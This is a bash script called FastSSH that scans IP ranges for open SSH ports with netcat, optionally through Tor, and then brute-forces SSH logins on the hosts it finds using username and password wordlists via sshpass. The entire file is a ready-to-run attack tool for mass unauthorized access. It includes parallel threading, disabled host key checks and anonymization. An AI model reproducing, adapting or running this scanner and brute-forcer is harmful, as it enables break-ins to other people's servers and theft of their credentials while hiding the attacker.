#!/bin/bash


banner() {

printf "\e[1;91m ______\e[0m\e[1;77m  _____         _   ____ ____  _   _  \e[0m\n"
printf "\e[1;91m \ \ \ \\\\\e[0m\e[1;77m|  ___|_ _ ___| |_/ ___/ ___|| | | | \e[0m\n"
printf "\e[1;91m  \ \ \ \ \e[0m\e[1;77m|_ / _\` / __| __\___ \___ \| |_| | \e[0m\n"
printf "\e[1;91m  / / / /  \e[0m\e[1;77m_| (_| \__ \ |_ ___) |__) |  _  | \e[0m\n"
printf "\e[1;91m /_/_/_/\e[0m\e[1;77m|_|  \__,_|___/\__|____/____/|_| |_| v1.0\e[0m\n"
printf "\n"
printf "\e[1;100m  Author: thelinuxchoice (Github/Instagram) \e[0m\n\n"


}

checktor() {

printf "\e[1;93m [*] Checking Tor connection...\e[0m"
check=$(curl -s --socks5-hostname localhost:9050 www.google.com; echo $?)
if [[ $check == *'0'* ]]; then
printf "\e[1;92mOK!\e[0m\n"
else
default_check_tor="N"
read -p $'\n\e[1;93m [!] Problem checking Tor connection.\e[0m\e[1;92m Continue ?\e[0m\e[1;77m [y/N]\e[0m' check_tor
check_tor="${check_tor:-${default_check_tor}}"
if [[ $check_tor == "N" || $check_tor == "No" || $check_tor == "n" || $check_tor == "no" ]]; then
exit 1
fi
fi
}

use_tor() {

default_read_tor="Y"
read -p $'\e[1;92m[?] Use Tor?\e[0m \e[1;77m[Y/n]: \e[0m' read_tor
read_tor="${read_tor:-${default_read_tor}}"
if [[ $read_tor == "Y" || $read_tor == "yes" || $read_tor == "Yes" || $read_tor == "y" ]]; then
command="torify nc"
command2="torify sshpass"
checktor
else
command="nc"
command2="sshpass"
fi



}


dependencies() {

command -v nc > /dev/null 2>&1 || { echo >&2 "I require NetCat. Run: apt-get install nc. Aborting."; exit 1; }
command -v sshpass > /dev/null 2>&1 || { echo >&2 "I require sshpass. Run: apt-get install sshpass. Aborting."; exit 1; }
}


scan() {
use_tor
#banner
dependencies
read -p $'\e[1;37m[::] Put range ip part 1/4 \e[0m\e[91m(e.g.:192 255)  \e[0m\e[1;92m -> \e[0m' r1
read -p $'\e[1;37m[::] Put range ip part 2/4 \e[0m\e[91m(e.g: 168 255)  \e[0m\e[1;92m -> \e[0m' r2
read -p $'\e[1;37m[::] Put range ip part 3/4 \e[0m\e[91m(e.g.: 1 255)   \e[0m\e[1;92m -> \e[0m' r3
read -p $'\e[1;37m[::] Put range ip part 4/4 \e[0m\e[91m(e.g.: 10 255)  \e[0m\e[1;92m -> \e[0m' r4
default_port=22
read -p $'\e[1;37m[::] Port to scan\e[0m \e[91m(Default 22):\e[0m ' port
port="${port:-${default_port}}"
default_threads=100
read -p $'\e[1;37m[::] Numbers of Threads to scan \e[91m(Default 100):\e[0m \e[0m' threads
threads="${threads:-${default_threads}}"
rm -rf targets
for x in $(seq $r1);do for y in $(seq $r2);do for z in $(seq $r3);do for w in $(seq $r4);do
printf "%s.%s.%s.%s\n" $x $y $z $w >> targets
done done done done
rm -rf logip;
count_target=$(wc -l targets | cut -d " " -f1)
printf "\e[1;92m[*] Targets:\e[0m\e[1;77m %s\e[0m\n" $count_target
printf "\e[1;92m[*] Starting scanner...\e[0m\n"
sleep 2
count=0
startline=1
endline="$threads"
while [ $((count+1)) -lt $count_target ]; do
for target in $(sed -n ''$startline','$endline'p' targets); do
let count++
printf "\e[1;93mScanning target:\e[0m\e[77m %s \e[0m\e[1;93m(\e[0m\e[77m%s\e[0m\e[1;93m/\e[0m\e[77m%s\e[0m\e[1;93m)\e[0m\n" $target $count $count_target
{(trap ''SIGINT && check=$($command $target $port -v -z -w5 > /dev/null 2>&1; echo $?); if [[ $check == "0" ]]; then echo $target >> logip; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads

done

if [[ -f logip ]]; then
countip=$(wc -l logip | cut -d " " -f1)
printf "\e[1;92m[*] IPs Found:\e[0m\e[1;77m %s\e[0m\n" $countip 
printf "\e[1;92m[*] Saved:\e[0m\e[1;77m logip\n\e[0m"

default_brute="Y"
read -p $'\e[1;92m[?] Start Brute Forcer?\e[0m\e[1;77m [Y/n]\e[0m' brute
brute="${brute:-${default_brute}}"
if [[ "$brute" == "Y" || "$brute" == "y" || "$brute" == "yes" || "$brute" == "Yes" ]]; then
bruteforcer
else
exit 1
fi
else
printf "\e[1;91m[!] No IPs Found in this range!\e[0m\n"
exit 1
fi
}

bruteforcer() {
#banner
dependencies
use_tor
defaultip_list="logip"
read -p $'\e[1;92m[::] Ip list\e[0m \e[77m(Default: logip): \e[0m' ip_list
ip_list="${ip_list:-${defaultip_list}}"
if [[ ! $ip_list ]]; then
printf "[!] File not found!"
bruteforcer
fi
default_port=22
read -p $'\e[1;92m[::] Port \e[0m\e[77m(Default 22): \e[0m' port
port="${port:-${default_port}}"
default_user="usernames"
default_pass="passwords"
read -p $'\e[1;92m[::] Usernames list \e[0m\e[77m(Hit Enter to Default list): \e[0m' wl_user 
wl_user="${wl_user:-${default_user}}"
read -p $'\e[1;92m[::] Passwords list \e[0m\e[77m(Hit Enter to Default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_pass}}"

count_ip=$(wc -l $ip_list | cut -d " " -f1)
count_user=$(wc -l $wl_user | cut -d " " -f1)
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
countsum=$((count_ip*count_user*count_pass))
start=1
end=1
IFS=$'\n'
while [ true ]; do

for user in $(cat $wl_user); do
for password in $(cat $wl_pass); do

for ip in $(sed -n ''$start','$end'p' $ip_list); do
IFS=$'\n'
nip=$(grep -n -x "$ip" "$ip_list" | cut -d ":" -f1)
printf "\e[1;93mTrying IP:\e[0m\e[77m %s (%s/%s)\e[0m\e[1;93m User:\e[0m\e[77m %s\e[0m\e[1;93m Pass:\e[0m\e[77m %s\e[0m\n" $ip $nip $count_ip $user $password
{(trap ''SIGINT && check=$($command2 -p "$password" ssh -o StrictHostKeyChecking=no "$user"@"$ip" -p $port uname -a 2> /dev/null | grep -c "0" ); if [[ $check == "1" ]]; then printf "\e[1;92m\n\n[*] Found! IP:\e[0m\e[1;77m %s\e[0m,\e[1;92m User:\e[0m\e[1;77m %s\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\n\e[0m" $ip $user $password ; sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$user"@"$ip" -p $port uname -a ; kill -1 $$; fi ) } & done done; wait $!;
sleep 4

done
let start++
let end++
done
printf "\e[1;91m[!] No credentials found!\e[0m\n"
exit 1

}

case "$1" in --scan) scan ;; --bruteforcer) bruteforcer ;; *)
banner
printf "\e[1;77mUsage: ./fastssh.sh --scan / --bruteforcer\e[0m\n"
esac
